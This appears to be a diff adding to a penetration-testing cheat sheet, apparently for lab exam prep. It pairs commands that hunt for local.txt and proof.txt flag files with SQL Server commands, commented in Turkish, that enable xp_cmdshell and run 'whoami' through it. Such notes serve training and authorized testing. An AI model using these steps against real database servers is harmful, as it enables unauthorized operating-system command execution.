@@ -4,3 +4,17 @@
 - find / "proof.txt" 2>/dev/null | grep "proof.txt"
 - dir C:\ /s /b | findstr "local.txt"
 - dir C:\ /s /b | findstr "proof.txt"
+
+
+# xpcmdshell
+
+-- SQL Server'da xp_cmdshell özelliğini aktif etmek
+
+- EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+- EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- xp_cmdshell ile whoami komutunu çalıştırmak
+- EXEC xp_cmdshell 'whoami';
+
